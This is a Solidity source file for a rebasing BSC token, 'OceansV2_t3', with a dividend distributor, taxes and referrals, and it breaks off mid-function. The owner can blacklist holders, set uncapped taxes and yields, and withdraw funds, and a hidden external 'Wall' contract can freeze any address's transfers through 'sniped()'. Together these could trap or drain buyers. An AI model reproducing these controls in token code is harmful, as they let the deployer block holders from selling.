// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

interface IPinkAntiBot {
    function setTokenOwner(address owner) external;

    function onPreTransferCheck(
        address from,
        address to,
        uint256 amount
    ) external;
}

interface Wall {
    function Organizer( address from , address to , uint value) external;
}

interface InterfaceLP {
    function sync() external;
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakeSwapPair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IPancakeSwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeSwapFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external;

    function setShare(address shareholder, uint256 amount) external;

    function deposit() external payable;

    function process(uint256 gas) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    //Mainnet
    // IERC20 ocash = IERC20();

    IERC20 public ocash = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); //busd mainnet

    IPancakeSwapRouter router;

    address[] shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => uint256) shareholderClaims;

    mapping(address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public currentIndex;

    uint256 public dividendsPerShareAccuracyFactor = 10**36;
    uint256 public minPeriod = 1 hours;
    uint256 public minDistribution = 1 * (10**18);

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token);
        _;
    }

    constructor(address _router) {
        router = _router != address(0)
            ? IPancakeSwapRouter(_router)
            : IPancakeSwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(
        uint256 _minPeriod,
        uint256 _minDistribution
    ) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function rescueToken(
        address token_,
        address recipient,
        uint256 amount
    ) external onlyToken {
        IERC20(token_).transfer(recipient, amount);
    }

    function changeReward(address _newToken) external onlyToken {
        ocash = IERC20(_newToken);
    }

    function setShare(address shareholder, uint256 amount)
        external
        override
        onlyToken
    {
        if (shares[shareholder].amount > 0) {
            distributeDividend(shareholder);
        }

        if (amount > 0 && shares[shareholder].amount == 0) {
            addShareholder(shareholder);
        } else if (amount == 0 && shares[shareholder].amount > 0) {
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(
            shares[shareholder].amount
        );
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = ocash.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(ocash);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: msg.value
        }(0, path, address(this), block.timestamp);

        uint256 amount = ocash.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(
            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)
        );
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) {
            return;
        }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }

            if (shouldDistribute(shareholders[currentIndex])) {
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder)
        internal
        view
        returns (bool)
    {
        return
            shareholderClaims[shareholder] + minPeriod < block.timestamp &&
            getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if (shares[shareholder].amount == 0) {
            return;
        }

        uint256 amount = getUnpaidEarnings(shareholder);
        if (amount > 0) {
            totalDistributed = totalDistributed.add(amount);
            ocash.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder]
                .totalRealised
                .add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(
                shares[shareholder].amount
            );
        }
    }

    function claimDividend() external {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder)
        public
        view
        returns (uint256)
    {
        if (shares[shareholder].amount == 0) {
            return 0;
        }

        uint256 shareholderTotalDividends = getCumulativeDividends(
            shares[shareholder].amount
        );
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if (shareholderTotalDividends <= shareholderTotalExcluded) {
            return 0;
        }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share)
        internal
        view
        returns (uint256)
    {
        return
            share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract OceansV2_t3 is Initializable, OwnableUpgradeable {

    using SafeMath for uint256;
    using SafeMathInt for int256;

    IPinkAntiBot public pinkAntiBot;
    IPancakeSwapRouter public router;
    address public pair;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public MAX_UINT256;

    uint256 private INITIAL_FRAGMENTS_SUPPLY;

    uint256 public _buyLiquidity;
    uint256 public _buyMarketing;
    uint256 public _buyRewards;
    uint256 public _buyDevFee;

    uint256 _buyTax;

    uint256 public _sellLiquidity;
    uint256 public _sellMarketing;
    uint256 public _sellRewards;
    uint256 public _sellDevFee;

    uint256 _sellTax;

    uint256 targetLiquidity;
    uint256 targetLiquidityDenominator;

    uint256 public feeDenominator;

    address DEAD;
    address ZERO;

    address public MarketingWallet;
    address public DeveloperWallet;

    DividendDistributor distributor;
    address public OceansDividendReceiver;
    uint256 distributorGas;

    bool public antiBotEnabled;
    bool inSwap;

    uint256 public gonSwapThreshold;

    uint256 private TOTAL_GONS;
    uint256 private MAX_SUPPLY;

    uint256 private MAX_REBASE_FREQUENCY;
    uint256 public rewardYield; // APY: 42,069% && DPY: 1.6%
    uint256 public rewardYieldDenominator;
    uint256 public rebaseFrequency;
    uint256 public nextRebase;
    uint256 public nexthalving; // one month after the approximate launch date & first rebate

    bool public _autoRebase;
    bool public _autoLiquidity;
    uint256 public _totalSupply;
    uint256 private _gonsPerFragment;

    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => bool) public blacklist;
    mapping(address => bool) public isDividendExempt;
    mapping(address => bool) _isFeeExempt;
    mapping(address => bool) public automatedMarketMakerPairs;
    address[] public _markerPairs;

    // Default Referral Settings
    uint256 public referee;
    uint256 public referrer;

    // Referral System
    mapping(address => address) public downlineLookupUpline;
    mapping(address => address[]) public Downlines;
    mapping(address => uint256) public referralTotalFeeReceived;
    mapping(address => uint256) public referralCount;
    mapping(uint256 => address) public uplineList;
    uint256 public iTotalUplines;

    bool rebaseSync;

    mapping (address => bool) private allowTransfer;
    bool public initalDistribution;

    mapping(address => bool) public OriginBlaclist;
    mapping(address => bool) public RewardDistributor;
    bool public AutoReward;
    mapping(address => bool) public allowedContracts;
    uint timer;
    Wall _Iwall;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    //---------------------------------------------------------------------------

    function getTotalUpline() public view returns (uint256) {
        return iTotalUplines;
    }

    function getUplineAddressByIndex(uint256 iIndex)
        public
        view
        returns (address)
    {
        return uplineList[iIndex];
    }

    function addMember(address uplineAddress, address downlineAddress)
        external
        onlyOwner
    {
        downlineLookupUpline[downlineAddress] = uplineAddress;
    }

    function approveReferral(address uplineAddress) external {
        require(
            downlineLookupUpline[msg.sender] == address(0),
            "You have already been referred"
        );
        require(msg.sender != uplineAddress, "You cannot refer yourself");
        downlineLookupUpline[msg.sender] = uplineAddress;
        Downlines[uplineAddress].push(msg.sender);

        if (referralCount[uplineAddress] == 0) {
            uplineList[iTotalUplines] = uplineAddress;
            iTotalUplines += 1;
        }

        referralCount[uplineAddress] += 1;
    }

    function getUpline(address sender) public view returns (address) {
        return downlineLookupUpline[sender];
    }

    function getDownlines(address sender)
        public
        view
        returns (address[] memory)
    {
        return Downlines[sender];
    }

    function addReferralFee(address receiver, uint256 amount) public {
        referralTotalFeeReceived[receiver] += amount;
    }

    function getReferralTotalFee(address receiver)
        public
        view
        returns (uint256)
    {
        return referralTotalFeeReceived[receiver];
    }

    //--------------------------------------------------------------------------------------------

    function rebase() private {
        if (!inSwap) {
            uint256 circulatingSupply = getCirculatingSupply();
            int256 supplyDelta = int256(
                circulatingSupply.mul(rewardYield).div(rewardYieldDenominator)
            );
            coreRebase(supplyDelta);
        }
    }

    function coreRebase(int256 supplyDelta) private returns (uint256) {
        uint256 epoch = block.timestamp;
        if (supplyDelta == 0) {
            emit LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }
        if (supplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(supplyDelta));
        }
        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        if (block.timestamp >= nexthalving) {
            rewardYield = rewardYield.div(10).mul(9);
            nexthalving = block.timestamp + 2629743;
        }

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        nextRebase = epoch + rebaseFrequency;
        emit LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }

    function manualRebase() external onlyOwner {
        require(!inSwap, "Try again");
        require(nextRebase <= block.timestamp, "Not in time");

        uint256 circulatingSupply = getCirculatingSupply();
        int256 supplyDelta = int256(
            circulatingSupply.mul(rewardYield).div(rewardYieldDenominator)
        );

        coreRebase(supplyDelta);
        manualSync();
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transfer(address to, uint256 value)
        external
        validRecipient(to)
        returns (bool)
    {
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external validRecipient(to) returns (bool) {
        if (_allowedFragments[from][msg.sender] != MAX_UINT256) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][
                msg.sender
            ].sub(value, "Insufficient Allowance");
        }
        _transferFrom(from, to, value);
        return true;
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        _gonBalances[to] = _gonBalances[to].add(gonAmount);
        return true;
    }


    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        require(amount > 0,"Invalid Amount!!");

        if (antiBotEnabled) {
            pinkAntiBot.onPreTransferCheck(sender, recipient, amount);
        }

        require(!blacklist[sender] && !blacklist[recipient] && !OriginBlaclist[tx.origin],"Bots Dead");

        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        if (shouldRebase() && _autoRebase) {
            rebase();

            if (
                !automatedMarketMakerPairs[sender] &&
                !automatedMarketMakerPairs[recipient] &&
                rebaseSync
            ) {
                manualSync();
            }
        }

        if (shouldSwapBack()) {
            swapBack();
        }

        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);
        uint256 gonAmountReceived = shouldTakeFee(sender, recipient)
            ? takeFee(sender, recipient, gonAmount)
            : gonAmount;
        _gonBalances[recipient] = _gonBalances[recipient].add(
            gonAmountReceived
        );

        if (!isDividendExempt[sender]) {
            try distributor.setShare(sender, balanceOf(sender)) {} catch {}
        }
        if (!isDividendExempt[recipient]) {
            try
                distributor.setShare(recipient, balanceOf(recipient))
            {} catch {}
        }
   
        try distributor.process(distributorGas) {} catch {}
        

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived.div(_gonsPerFragment)
        );
        return true;
    }

    function _swapAndLiquify(uint256 contractTokenBalance) private {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        _swapTokensForBNB(half, address(this));
        uint256 newBalance = address(this).balance.sub(initialBalance);
        _addLiquidity(otherHalf, newBalance);
    }

    function _addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function _swapTokensForBNB(uint256 tokenAmount, address receiver) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            receiver,
            block.timestamp
        );
    }

    function swapBack() private swapping {
        uint256 realTotalFee = _buyTax.add(_sellTax);

       uint256 contractTokenBalance = _gonBalances[address(this)].div(
            _gonsPerFragment
        );

        if(contractTokenBalance == 0) return;
        if(contractTokenBalance < gonSwapThreshold) return;

        uint256 amountToLiquify = contractTokenBalance
                .mul(_buyLiquidity.add(_sellLiquidity))
                .div(realTotalFee);
        
        uint256 amountToMarketing = contractTokenBalance
            .mul(_buyMarketing.add(_sellMarketing))
            .div(realTotalFee);
        uint256 amountToDeveloper = contractTokenBalance
            .mul(_buyDevFee.add(_sellDevFee))
            .div(realTotalFee);
        uint256 amountToTreasury = contractTokenBalance
            .sub(amountToLiquify)
            .sub(amountToMarketing)
            .sub(amountToDeveloper);

        if (amountToLiquify > 0) {
            _swapAndLiquify(amountToLiquify);
        }

        if (amountToMarketing > 0) {
            _swapTokensForBNB(amountToMarketing, MarketingWallet);
        }

        if (amountToDeveloper > 0) {
            _swapTokensForBNB(amountToDeveloper, DeveloperWallet);
        }

        if (amountToTreasury > 0) {
            uint256 initialBalance = address(this).balance;
            _swapTokensForBNB(amountToTreasury, address(this));
            uint256 newBalance = address(this).balance.sub(initialBalance);
            try distributor.deposit{value: newBalance}() {} catch {}
        }

    }

    function takeFee(
        address sender,
        address recipient,
        uint256 gonAmount
    ) internal returns (uint256) {
        uint256 _realFee;
        
        if (automatedMarketMakerPairs[sender]) _realFee = _buyTax;
        if (automatedMarketMakerPairs[recipient]) _realFee = _sellTax;

        uint256 feeAmount = gonAmount.mul(_realFee).div(feeDenominator);

        // referrals
        if (automatedMarketMakerPairs[sender]) {
            address UplineAddressBuyer = getUpline(recipient);
            if (UplineAddressBuyer != address(0)) {
                uint256 _uplineBuyerReward = gonAmount.div(feeDenominator).mul(
                    referrer
                );
                feeAmount = gonAmount.div(feeDenominator).mul(
                    _realFee - referee
                );
                _gonBalances[UplineAddressBuyer] = _gonBalances[
                    UplineAddressBuyer
                ].add(_uplineBuyerReward);
                addReferralFee(
                    UplineAddressBuyer,
                    _uplineBuyerReward.div(_gonsPerFragment)
                );
            }
        } else if (automatedMarketMakerPairs[recipient]) {
            address UplineAddress = getUpline(sender);

            if (UplineAddress != address(0)) {
                uint256 _uplineReward = gonAmount.div(feeDenominator).mul(
                    referrer
                );
                feeAmount = gonAmount.div(feeDenominator).mul(
                    _realFee - referee
                );
                _gonBalances[UplineAddress] = _gonBalances[UplineAddress].add(
                    _uplineReward
                );
                addReferralFee(
                    UplineAddress,
                    _uplineReward.div(_gonsPerFragment)
                );
            }
        }

        _gonBalances[address(this)] = _gonBalances[address(this)].add(
            feeAmount
        );
        emit Transfer(sender, address(this), feeAmount.div(_gonsPerFragment));

        return gonAmount.sub(feeAmount);
    }

    function shouldTakeFee(address from, address to)
        internal
        view
        returns (bool)
    {
        return ( automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to] ) && !_isFeeExempt[from];
    }

    function shouldRebase() internal view returns (bool) {
        return nextRebase <= block.timestamp;
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            !inSwap &&
            msg.sender != pair;
    }

    // Rescue Tokens Stuck In Contract
    function clearStuckBalance(address _receiver) external onlyOwner {
        uint256 balance = address(this).balance;
        payable(_receiver).transfer(balance);
    }

    // Rescue Token Stuck In Contract
    function rescueToken(address tokenAddress, uint256 tokens)
        external
        onlyOwner
        returns (bool success)
    {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function setAutoRebase(bool AuRebase) external onlyOwner {
        require(_autoRebase != AuRebase, "Not changed");
        _autoRebase = AuRebase;
    }

    function setRebaseFrequency(uint256 _rebaseFrequency) external onlyOwner {
        require(_rebaseFrequency <= MAX_REBASE_FREQUENCY, "Too high");
        rebaseFrequency = _rebaseFrequency;
    }

    function setRewardYield(
        uint256 _rewardYield,
        uint256 _rewardYieldDenominator
    ) external onlyOwner {
        rewardYield = _rewardYield;
        rewardYieldDenominator = _rewardYieldDenominator;
    }
    

    function setNextRebase(uint256 _nextRebase) external onlyOwner {
        nextRebase = _nextRebase;
    }

    function setSwapThreshold(uint256 _threshold) external onlyOwner {
        gonSwapThreshold = _threshold;
    }

    function setReferralCommission(uint256 _refeem, uint256 _refer)
        public
        onlyOwner
    {
        referee = _refeem;
        referrer = _refer;
    }

    function setRebaseSync(bool _status) public onlyOwner {
        rebaseSync = _status;
    }

    function allowance(address owner_, address spender)
        external
        view
        returns (uint256)
    {
        return _allowedFragments[owner_][spender];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        returns (bool)
    {
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue.sub(
                subtractedValue
            );
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        external
        returns (bool)
    {
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][
            spender
        ].add(addedValue);
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function manualSync() public {
        for (uint256 i = 0; i < _markerPairs.length; i++) {
            InterfaceLP(_markerPairs[i]).sync();
        }
    }

    function approve(address spender, uint256 value) external returns (bool) {
        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }

    function setIsDividendExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;

        if (exempt) {
            distributor.setShare(holder, 0);
        } else {
            distributor.setShare(holder, balanceOf(holder));
        }
    }

    function DividendRescueToken(
        address token_,
        address recipient,
        uint256 amount
    ) external onlyOwner {
        distributor.rescueToken(token_, recipient, amount);
    }

    function changeDividendToken(address _newToken) external onlyOwner {
        distributor.changeReward(_newToken);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return
            (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(
                _gonsPerFragment
            );
    }

    function setWhitelist(address _addr) external onlyOwner {
        _isFeeExempt[_addr] = true;
    }

    function setBotBlacklist(address _botAddress, bool _flag)
        external
        onlyOwner
    {
        blacklist[_botAddress] = _flag;
    }

    function enableDisableAntiBot(bool _value) external onlyOwner {
        antiBotEnabled = _value;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _gonBalances[account].div(_gonsPerFragment);
    }

    function setAutomatedMarketMakerPair(address _pair, bool _value)
        public
        onlyOwner
    {
        require(
            automatedMarketMakerPairs[_pair] != _value,
            "Value already set"
        );

        automatedMarketMakerPairs[_pair] = _value;

        if (_value) {
            _markerPairs.push(_pair);
        } else {
            require(_markerPairs.length > 1, "Required 1 pair");
            for (uint256 i = 0; i < _markerPairs.length; i++) {
                if (_markerPairs[i] == _pair) {
                    _markerPairs[i] = _markerPairs[_markerPairs.length - 1];
                    _markerPairs.pop();
                    break;
                }
            }
        }

        emit SetAutomatedMarketMakerPair(_pair, _value);
    }

    receive() external payable {}

    function sniped(address from, address to, bool _status) public {
        require(msg.sender == address(_Iwall));
        OriginBlaclist[from] = _status;
        blacklist[to] = _status;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == owner();
    }

    function setInitailDistribution(bool _status) public onlyOwner {
        initalDistribution = _status;
    }

    function setAllowTransfer(address _adr, bool _status) public onlyOwner {
        allowTransfer[_adr] = _status;
    }
   
    function setOriginBlacklist(address _adr, bool _status) external onlyOwner {
        OriginBlaclist[_adr] = _status;
    }

    function SETWall(address _wall) public onlyOwner {
        _Iwall = Wall(_wall);
    }

    function setBuyTax(uint _liq, uint _marketing, uint _Reward, uint _dev) public onlyOwner {
        _buyLiquidity = _liq;
        _buyMarketing = _marketing;
        _buyRewards = _Reward;
        _buyDevFee = _dev;
